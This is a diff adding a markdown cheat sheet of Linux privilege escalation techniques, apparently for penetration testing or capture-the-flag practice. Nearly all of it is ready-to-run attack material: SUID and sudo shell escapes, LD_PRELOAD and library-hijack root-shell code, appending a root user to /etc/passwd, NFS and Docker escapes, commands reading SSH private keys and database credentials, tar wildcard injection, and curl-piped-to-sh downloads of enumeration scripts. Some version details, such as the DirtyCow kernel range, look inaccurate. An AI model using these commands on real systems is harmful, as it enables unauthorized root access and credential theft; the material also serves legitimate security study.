@@ -1,0 +1,253 @@
+# Linux Privilege Escalation Techniques
+
+## SUID/SGID Binaries
+
+### Find SUID Files
+```bash
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+```
+
+### Common Exploitable SUID Binaries
+- /usr/bin/find: `find . -exec /bin/sh \; -quit`
+- /usr/bin/vim: `vim -c ':!sh'`
+- /usr/bin/nano: `nano -s /bin/sh` then Ctrl+T
+- /usr/bin/less: `less /etc/profile` then `!/bin/sh`
+- /usr/bin/awk: `awk 'BEGIN {system("/bin/sh")}'`
+- /usr/bin/python: `python -c 'import os; os.system("/bin/sh")'`
+- /usr/bin/perl: `perl -e 'exec "/bin/sh";'`
+- /usr/bin/nmap: `nmap --interactive` then `!sh`
+
+## Sudo Exploitation
+
+### Check Sudo Rights
+```bash
+sudo -l
+```
+
+### GTFOBins Commands
+Common commands with sudo that can be exploited:
+- `sudo find . -exec /bin/sh \; -quit`
+- `sudo vim -c ':!sh'`
+- `sudo awk 'BEGIN {system("/bin/sh")}'`
+- `sudo less /etc/profile` then `!/bin/sh`
+- `sudo python -c 'import os; os.system("/bin/sh")'`
+- `sudo perl -e 'exec "/bin/sh";'`
+
+### LD_PRELOAD Trick
+If `env_keep+=LD_PRELOAD` in sudoers:
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+Compile: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+Execute: `sudo LD_PRELOAD=/tmp/shell.so <any_sudo_command>`
+
+## Kernel Exploits
+
+### Check Kernel Version
+```bash
+uname -a
+cat /proc/version
+cat /etc/issue
+```
+
+### Common Kernel Exploits
+- DirtyCow (CVE-2016-5195): Linux Kernel 2.6.22 < 3.9
+- PwnKit (CVE-2021-4034): pkexec vulnerability
+- DirtyPipe (CVE-2022-0847): Linux Kernel 5.8+
+
+## Cron Jobs
+
+### Check Cron Jobs
+```bash
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+cat /var/spool/cron/crontabs/*
+```
+
+### Exploitable Scenarios
+- World-writable script in cron
+- Writable script directory
+- PATH manipulation in cron
+
+## Capabilities
+
+### Find Capabilities
+```bash
+getcap -r / 2>/dev/null
+```
+
+### Exploitable Capabilities
+- `cap_setuid+ep`: Can change UID to root
+- `cap_dac_read_search+ep`: Can read any file
+- `cap_dac_override+ep`: Can write any file
+
+### Python with cap_setuid
+```python
+import os
+os.setuid(0)
+os.system("/bin/bash")
+```
+
+## Writable /etc/passwd
+
+### Add Root User
+```bash
+openssl passwd -1 -salt hack password123
+echo 'hacker:$1$hack$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
+su hacker
+```
+
+## NFS Root Squashing
+
+### Check NFS Exports
+```bash
+cat /etc/exports
+showmount -e <target_ip>
+```
+
+### no_root_squash Exploit
+```bash
+# On attacker machine
+mkdir /tmp/nfs
+mount -t nfs <target_ip>:/shared /tmp/nfs
+cp /bin/bash /tmp/nfs/bash
+chmod +s /tmp/nfs/bash
+
+# On target
+/shared/bash -p
+```
+
+## Docker Escape
+
+### Check if in Container
+```bash
+ls -la /.dockerenv
+cat /proc/1/cgroup | grep docker
+```
+
+### Docker Socket Escape
+If `/var/run/docker.sock` is accessible:
+```bash
+docker run -v /:/host -it ubuntu chroot /host bash
+```
+
+### Privileged Container
+```bash
+# Check capabilities
+capsh --print
+
+# Mount host filesystem
+mkdir /host
+mount /dev/sda1 /host
+chroot /host
+```
+
+## Password & SSH Keys
+
+### Common Locations
+```bash
+# History
+cat ~/.bash_history
+cat ~/.mysql_history
+cat ~/.nano_history
+
+# Config files
+cat ~/.ssh/id_rsa
+cat ~/.ssh/authorized_keys
+cat /root/.ssh/id_rsa
+cat ~/.bashrc
+cat ~/.profile
+
+# Backup files
+find / -name "*.bak" 2>/dev/null
+find / -name "*backup*" 2>/dev/null
+
+# Database credentials
+cat /var/www/html/config.php
+cat /etc/mysql/my.cnf
+grep -r "password" /var/www/ 2>/dev/null
+```
+
+## Process Exploitation
+
+### Check Running Processes
+```bash
+ps aux
+ps -ef
+pspy64 (monitor processes without root)
+```
+
+### Process Injection
+If running as same user, can inject into process
+
+## Services Exploitation
+
+### Check Running Services
+```bash
+netstat -antup
+ss -tulpn
+```
+
+### MySQL Root without Password
+```bash
+mysql -u root
+use mysql;
+update user set authentication_string=PASSWORD('password') where User='root';
+flush privileges;
+```
+
+## Wildcards Exploitation
+
+### Tar Wildcard
+```bash
+# If script does: tar czf backup.tar.gz *
+echo "" > "--checkpoint=1"
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+```
+
+## Path Hijacking
+
+### If Script Uses Relative Paths
+```bash
+export PATH=/tmp:$PATH
+echo "/bin/bash" > /tmp/command
+chmod +x /tmp/command
+```
+
+## Environment Variables
+
+### LD_LIBRARY_PATH
+If setuid binary uses relative library:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+    unsetenv("LD_LIBRARY_PATH");
+    setuid(0);
+    system("/bin/bash -p");
+}
+```
+
+## Linux Enumeration Scripts
+
+### Download and Run
+```bash
+# LinPEAS
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# LinEnum
+curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh
+```
